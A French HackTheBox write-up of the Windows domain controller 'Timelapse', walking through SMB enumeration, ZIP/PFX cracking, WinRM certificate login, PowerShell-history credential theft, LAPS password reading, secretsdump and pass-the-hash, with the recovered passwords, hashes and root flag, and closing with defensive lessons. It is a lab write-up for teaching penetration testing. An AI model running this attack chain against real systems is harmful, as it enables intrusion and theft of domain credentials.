🏁 Timelapse - HTB Write-Up Complet

Date : 13/12/2025
Auteur : rickzz
Difficulté : Easy
OS : Windows Server 2019
IP : 10.10.11.152
Domaine : timelapse.htb

📚 Table des Matières
Résumé Exécutif
Reconnaissance & Scan
Énumération SMB
Cracking du ZIP et PFX
Accès Initial via WinRM
Élévation vers svc_deploy
Exploitation LAPS
Accès Root Final
Post-Exploitation
Leçons Apprises
🎯 Résumé Exécutif

Timelapse est une machine Windows Easy qui illustre plusieurs concepts clés de la sécurité Active Directory :

Chaîne d'exploitation :
SMB anonyme → Fichier ZIP protégé par mot de passe
Cracking ZIP (John) → Fichier PFX chiffré
Cracking PFX (John) → Certificat SSL + clé privée
Authentification WinRM (certificat) → Utilisateur legacyy
PowerShell History → Credentials svc_deploy
Groupe LAPS_Readers → Password Administrator local
Pass-the-Hash → Accès root via utilisateur TRX
Concepts techniques abordés :
✅ Énumération SMB et partages anonymes
✅ Cracking de fichiers protégés (ZIP, PFX)
✅ Authentification par certificat (WinRM)
✅ Analyse de l'historique PowerShell
✅ Abus de LAPS (Local Administrator Password Solution)
✅ Pass-the-Hash avec Evil-WinRM
✅ Dumping de secrets avec Impacket
🧠 Reconnaissance & Scan
🔍 Scan Nmap Initial

Commande rapide pour découvrir les ports ouverts :

nmap -p- --min-rate 10000 10.10.11.152

Scan détaillé des services identifiés :

nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49693,49725 -sC -sV -A 10.10.11.152 -oN nmap.txt
📊 Résultats du Scan
Port	Service	Version	Rôle
53	DNS	Simple DNS Plus	Résolution de noms
88	Kerberos	Microsoft Windows Kerberos	Authentification AD
135	MSRPC	Microsoft Windows RPC	Communication RPC
139	NetBIOS-SSN	Microsoft Windows NetBIOS	Partage de fichiers (legacy)
389	LDAP	Microsoft AD LDAP	Annuaire Active Directory
445	SMB	Microsoft-DS	Partage de fichiers moderne
464	kpasswd5	-	Changement de mot de passe Kerberos
593	HTTP-RPC	Microsoft Windows RPC over HTTP	RPC via HTTP
636	LDAPS	-	LDAP sécurisé (SSL/TLS)
3268	Global Catalog	Microsoft AD LDAP	Catalogue global AD
3269	GC-SSL	-	Catalogue global sécurisé
5986	WinRM-HTTPS	Microsoft HTTPAPI 2.0	PowerShell Remoting sécurisé
9389	ADWS	.NET Message Framing	Active Directory Web Services
🎓 Analyse des Résultats

Points clés identifiés :

Contrôleur de domaine Windows : Présence de DNS, Kerberos, LDAP, Global Catalog
Nom du domaine : timelapse.htb (via LDAP)
Nom de la machine : DC01 (via certificat SSL sur port 5986)
WinRM actif : Port 5986 (HTTPS) - possibilité de connexion PowerShell à distance
Décalage horaire : +59 minutes et 53 secondes (important pour Kerberos)

💡 Astuce : Le décalage horaire peut causer des problèmes d'authentification Kerberos. Dans un vrai pentest, il faudrait synchroniser l'horloge avec :

sudo ntpdate -s 10.10.11.152
📂 Énumération SMB
🔎 Qu'est-ce que SMB ?

SMB (Server Message Block) est un protocole de partage de fichiers Windows. Il peut être mal configuré et permettre :

Accès anonyme aux partages
Énumération des utilisateurs
Récupération de fichiers sensibles
🛠️ Énumération des Partages

Commande pour lister les partages accessibles anonymement :

smbclient -L //10.10.11.152 -N

Flags utilisés :

-L : Lister les partages
-N : Pas de mot de passe (connexion anonyme)
📁 Partages Découverts
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Shares          Disk      
SYSVOL          Disk      Logon server share

🔍 Analyse :

ADMIN$, C$, IPC$ : Partages par défaut (accès refusé sans credentials)
NETLOGON, SYSVOL : Partages standards d'un DC (accès généralement authentifié)
Shares : ⚠️ Partage personnalisé potentiellement intéressant !
🚪 Connexion au Partage "Shares"
smbclient //10.10.11.152/Shares -N

Exploration du contenu :

smb: \> ls
  .                                   D        0  Mon Oct 25 17:39:15 2021
  ..                                  D        0  Mon Oct 25 17:39:15 2021
  Dev                                 D        0  Mon Oct 25 21:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021

Navigation et téléchargement :

smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 21:40:06 2021
  ..                                  D        0  Mon Oct 25 21:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021

smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (8.1 KiloBytes/sec)

🎓 Point Important : Le nom du fichier winrm_backup.zip suggère qu'il contient probablement des credentials ou certificats pour WinRM.

🔓 Cracking du ZIP et PFX
Étape 1 : Cracking du ZIP

🎯 Objectif : Le fichier ZIP est protégé par un mot de passe. Nous devons le craquer.

Conversion du ZIP en format John :

zip2john winrm_backup.zip > zip.john

Cracking avec John the Ripper :

john zip.john --wordlist=/usr/share/wordlists/rockyou.txt

🔑 Résultat : supremelegacy

Extraction du contenu :

unzip winrm_backup.zip
# Mot de passe : supremelegacy

Fichier extrait : legacyy_dev_auth.pfx

🎓 Qu'est-ce qu'un fichier PFX ?

Un fichier PFX (Personal Information Exchange) est un conteneur qui stocke :

Un certificat SSL/TLS (partie publique)
Une clé privée (partie privée)
Éventuellement une chaîne de certificats

Il est utilisé pour :

Authentification par certificat (WinRM, IIS, VPN)
Signature de code
Chiffrement S/MIME (emails)
Étape 2 : Cracking du PFX

Conversion du PFX en format John :

python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john

⚠️ Problème rencontré : Le script nécessite asn1crypto

Solution :

# Installer le package système
sudo apt install python3-asn1crypto -y

# Réessayer avec Python3
python3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john

Cracking avec John :

john pfx.john --wordlist=/usr/share/wordlists/rockyou.txt

🔑 Résultat : thuglegacy

Étape 3 : Extraction du Certificat et de la Clé Privée

Extraction de la clé privée :

openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
# Mot de passe : thuglegacy

Extraction du certificat :

openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
# Mot de passe : thuglegacy

Flags OpenSSL expliqués :

-in : Fichier PFX en entrée
-nocerts : N'exporter que la clé privée
-nokeys : N'exporter que le certificat
-out : Fichier de sortie
-nodes : Ne pas chiffrer la clé privée exportée
🚪 Accès Initial via WinRM
🎓 Qu'est-ce que WinRM ?

Windows Remote Management (WinRM) est l'implémentation Microsoft du protocole WS-Management. Il permet :

L'exécution de commandes PowerShell à distance
L'administration de serveurs Windows
L'automatisation de tâches

Ports par défaut :

5985 : HTTP (non chiffré)
5986 : HTTPS (chiffré avec SSL/TLS)
🔐 Authentification par Certificat

Commande Evil-WinRM avec certificat :

evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S

Flags expliqués :

-i : Adresse IP cible
-c : Certificat (public key)
-k : Clé privée (private key)
-S : Activer SSL (port 5986)

✅ Connexion réussie !

*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
🏁 User Flag
type C:\Users\legacyy\Desktop\user.txt

User Flag : [votre_flag_ici]

⬆️ Élévation vers svc_deploy
🔍 Énumération Post-Exploitation

Commande pour vérifier les informations utilisateur :

whoami /all
net user legacyy /domain
🎯 PowerShell History - Goldmine de Credentials

🎓 Concept Important : PowerShell conserve un historique des commandes exécutées dans un fichier texte. Ce fichier contient souvent des credentials en clair !

Chemin du fichier d'historique :

$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Lecture de l'historique :

type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

📜 Contenu Découvert :

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
🔑 Credentials Trouvés

Utilisateur : svc_deploy
Mot de passe : E3R$Q62^12p7PLlC%KWaxuaV

🎓 Analyse du Code PowerShell :

# Créer des options de session (ignorer les erreurs SSL)
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck

# Convertir le mot de passe en SecureString
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force

# Créer un objet PSCredential
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)

# Exécuter une commande à distance
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
🔄 Connexion en tant que svc_deploy

Déconnexion de la session actuelle :

exit

Nouvelle connexion avec Evil-WinRM :

evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S

Vérification :

whoami
# timelapse\svc_deploy
🔓 Exploitation LAPS
🎓 Qu'est-ce que LAPS ?

LAPS (Local Administrator Password Solution) est une solution Microsoft qui :

Génère des mots de passe aléatoires pour les comptes administrateur locaux
Stocke ces mots de passe dans Active Directory (attribut ms-Mcs-AdmPwd)
Fait tourner automatiquement ces mots de passe selon une politique définie
Limite l'accès via des ACLs sur l'attribut AD

Objectif de sécurité : Éviter l'utilisation du même mot de passe admin local sur toutes les machines (attaques Pass-the-Hash laterales).

🔍 Découverte du Groupe LAPS_Readers

Énumération des groupes de l'utilisateur :

net user svc_deploy /domain

Résultat :

User name                    svc_deploy
Full Name                    svc_deploy
Comment
...
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users

💡 Observation Critique : svc_deploy est membre du groupe LAPS_Readers !

🎯 Abus de LAPS_Readers

🎓 Concept : Les membres du groupe LAPS_Readers peuvent lire l'attribut ms-Mcs-AdmPwd qui contient le mot de passe de l'administrateur local.

📋 Énumération des Ordinateurs du Domaine

Trouver le nom du contrôleur de domaine :

$env:LOGONSERVER
# Résultat : \\DC01

Ou lister tous les ordinateurs :

Get-ADComputer -Filter * | Select-Object Name
🔑 Récupération du Password LAPS

Commande PowerShell :

Get-ADComputer -Identity "DC01" -Properties ms-Mcs-AdmPwd | Select-Object name, ms-Mcs-AdmPwd

Résultat :

name  ms-Mcs-AdmPwd
----  -------------
DC01  I)}73pmp{9+;E2/kWv0LZ7Tt

🎉 Password Administrator Local Récupéré !

Credentials :

Utilisateur : Administrator
Mot de passe : I)}73pmp{9+;E2/kWv0LZ7Tt
🏆 Accès Root Final
Tentative 1 : Connexion en tant qu'Administrator
evil-winrm -i 10.10.11.152 -u Administrator -p 'I)}73pmp{9+;E2/kWv0LZ7Tt' -S

✅ Connexion Réussie !

🔍 Recherche du Root Flag

Recherche des fichiers .txt appartenant à Administrator :

Get-ChildItem -Path C:\ -Recurse -Filter *.txt -ErrorAction SilentlyContinue | Where-Object {$_.GetAccessControl().Owner -like "*Administrator*"}

Résultat Surprenant :

Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       12/13/2025   6:57 PM             34 root.txt

💡 Observation : Le flag root est dans le profil de l'utilisateur TRX, pas dans celui d'Administrator !

❌ Problème d'Accès

Tentative de lecture directe :

type C:\Users\TRX\Desktop\root.txt
# Access to the path 'C:\Users\TRX\Desktop' is denied.

🎓 Explication : Même en tant qu'Administrator du domaine, les ACLs (Access Control Lists) peuvent restreindre l'accès aux fichiers d'autres utilisateurs.

🚀 Post-Exploitation
💾 Dump des Secrets du Domaine

🎓 Pourquoi dumper les secrets ?

Cela permet d'obtenir :

Hashes NTLM de tous les utilisateurs du domaine
Clés Kerberos (AES256, AES128, DES)
Secrets LSA (Local Security Authority)
Clés de déchiffrement DPAPI
Hash du compte krbtgt (pour Golden Ticket)

Commande Impacket-secretsdump :

impacket-secretsdump Administrator:'I)}73pmp{9+;E2/kWv0LZ7Tt'@10.10.11.152
📊 Hashes Récupérés (Extrait)

Utilisateurs du Domaine :

Utilisateur	RID	Hash NTLM
Administrator	500	22d04d77cc32a59f9fe6701aa9ffafb0
krbtgt	502	2960d580f05cd511b3da3d3663f3cb37
legacyy	1603	93da975bcea111839cc584f2f528d63e
svc_deploy	3103	c912f3533b7114980dd7b6094be1a9d8
TRX	5101	4c7121d35cd421cbbd3e44ce83bc923e
🎯 Pass-the-Hash avec TRX

🎓 Technique Pass-the-Hash :

Au lieu d'utiliser un mot de passe en clair, on peut s'authentifier directement avec le hash NTLM. Evil-WinRM supporte cette technique.

Connexion avec le hash de TRX :

evil-winrm -i 10.10.11.152 -u TRX -H 4c7121d35cd421cbbd3e44ce83bc923e -S

Flags expliqués :

-u : Nom d'utilisateur
-H : Hash NTLM (au lieu de -p pour password)
-S : SSL activé

✅ Connexion Réussie !

🏁 Root Flag
type C:\Users\TRX\Desktop\root.txt

Root Flag : 6506078077b79f2969f0a0a69fe4eddf

🎓 Leçons Apprises
🔒 Vulnérabilités Identifiées
Vulnérabilité	Impact	Recommandation
Partage SMB anonyme	Accès à des fichiers sensibles	Désactiver l'accès anonyme aux partages
Mots de passe faibles (ZIP/PFX)	Cracking rapide avec dictionnaires	Utiliser des mots de passe complexes (20+ caractères)
Credentials en clair dans l'historique PowerShell	Exposition de credentials	Utiliser Get-Credential et éviter les mots de passe en clair
LAPS mal configuré	Lecture du password admin local	Restreindre l'accès au groupe LAPS_Readers
ACLs permissives	Accès non autorisé aux fichiers	Revoir les permissions NTFS régulièrement
🛡️ Bonnes Pratiques de Défense
1. Sécurisation SMB
# Désactiver SMBv1 (vulnérable)
Set-SmbServerConfiguration -EnableSMB1Protocol $false

# Exiger la signature SMB
Set-SmbServerConfiguration -RequireSecuritySignature $true
2. Gestion de l'Historique PowerShell
# Désactiver l'historique PowerShell (pas recommandé pour la détection)
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Ou nettoyer régulièrement
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
3. Hardening LAPS
Limiter le groupe LAPS_Readers aux administrateurs autorisés uniquement
Auditer les accès à l'attribut ms-Mcs-AdmPwd
Activer les logs d'accès AD
4. Monitoring et Détection
# Activer les logs PowerShell
Enable-PSTranscription
Enable-PSScriptBlockLogging

# Surveiller les accès WinRM
Get-WinEvent -LogName "Microsoft-Windows-WinRM/Operational"
💡 Techniques d'Attaque Apprises
Énumération SMB : Toujours vérifier les partages anonymes
Cracking de fichiers protégés : ZIP, PFX, RAR avec John ou Hashcat
Authentification par certificat : Alternative au mot de passe
PowerShell History Dumping : Source de credentials fréquente
LAPS Abuse : Exploitation de permissions AD mal configurées
Pass-the-Hash : Mouvement latéral sans mot de passe en clair
Secretsdump : Extraction complète des secrets d'un DC
🔧 Outils Utilisés
Outil	Usage	Commande Clé
Nmap	Scan de ports et services	nmap -sC -sV -A <IP>
smbclient	Énumération SMB	smbclient -L //<IP> -N
John the Ripper	Cracking ZIP/PFX	john hash.txt --wordlist=rockyou.txt
OpenSSL	Extraction certificat/clé	openssl pkcs12 -in file.pfx -out cert.pem
Evil-WinRM	Connexion WinRM	evil-winrm -i <IP> -u <user> -p <pass> -S
Impacket-secretsdump	Dump secrets AD	impacket-secretsdump <user>:<pass>@<IP>
📚 Ressources Complémentaires
HackTricks - LAPS
Microsoft LAPS Documentation
Evil-WinRM GitHub
Impacket Suite
PayloadsAllTheThings - Windows PrivEsc
⏱️ Timeline de l'Exploitation
Heure	Action	Résultat
T+0min	Scan Nmap	Identification DC Windows, ports SMB et WinRM ouverts
T+5min	Énumération SMB	Découverte du partage "Shares" accessible anonymement
T+10min	Téléchargement winrm_backup.zip	Fichier protégé par mot de passe
T+15min	Cracking ZIP avec John	Mot de passe : supremelegacy
T+20min	Cracking PFX avec John	Mot de passe : thuglegacy
T+25min	Extraction certificat + clé	Prêt pour authentification WinRM
T+30min	Connexion WinRM (legacyy)	✅ Accès initial obtenu
T+35min	Lecture PowerShell History	Credentials de svc_deploy découverts
T+40min	Connexion WinRM (svc_deploy)	Élévation réussie
T+45min	Énumération groupes	Découverte de LAPS_Readers
T+50min	Extraction password LAPS	Password Administrator récupéré
T+55min	Secretsdump du domaine	Tous les hashes NTLM récupérés
T+60min	Pass-the-Hash (TRX)	✅ Root Flag obtenu !

Temps total : ~60 minutes

🏁 Flags Finaux
User Flag : [Trouvé dans C:\Users\legacyy\Desktop\user.txt]
Root Flag : 6506078077b79f2969f0a0a69fe4eddf
📸 Schéma de la Chaîne d'Exploitation
[SMB Anonyme]
     ↓
[winrm_backup.zip] → Cracking → supremelegacy
     ↓
[legacyy_dev_auth.pfx] → Cracking → thuglegacy
     ↓
[Certificat SSL + Clé Privée]
     ↓
[WinRM Connexion] → legacyy
     ↓
[PowerShell History] → E3R$Q62^12p7PLlC%KWaxuaV
     ↓
[WinRM Connexion] → svc_deploy
     ↓
[Groupe LAPS_Readers] → ms-Mcs-AdmPwd
     ↓
[Password Administrator] → I)}73pmp{9+;E2/kWv0LZ7Tt
     ↓
[Secretsdump] → Hashes NTLM de tous les utilisateurs
     ↓
[Pass-the-Hash] → TRX → Root Flag 🏁

Terminé le : 13/12/2025
Statut : ✅ Pwned
Auteur : rickzz

Ce write-up a été réalisé dans un cadre éducatif légal sur la plateforme HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés.
